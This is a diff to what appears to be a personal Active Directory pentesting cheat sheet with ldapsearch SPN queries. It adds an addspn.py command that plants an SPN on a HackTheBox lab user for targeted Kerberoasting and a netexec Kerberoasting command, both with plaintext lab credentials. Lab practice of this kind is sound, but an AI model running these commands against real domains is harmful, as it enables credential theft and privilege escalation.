@@ -9,6 +9,8 @@ ldapsearch -x -h dc-ip -b "DC=domain,DC=com" "(servicePrincipalName=*)" serviceP
 ldapsearch -x -h dc-ip -b "DC=domain,DC=com" -H ldap://dc-ip "(servicePrincipalName=*)" servicePrincipalName userAccountControl sAMAccountName
 
 # Netexec
+python3 /home/sako/Special-Tools/Active-Directory/Krbrelayx/addspn.py -u 'tombwatcher.htb\henry' -p 'H3nry_987TGV!' -t ALFRED -s 'vibe/cyberdark' -dc-ip 10.129.232.167 10.129.232.167
+
 nxc ldap 192.168.0.239 -u 'Administrator' -p 'sako2005!' --kerberoasting hashes.txt
 
 # SPN Users Enum and TGS Dump
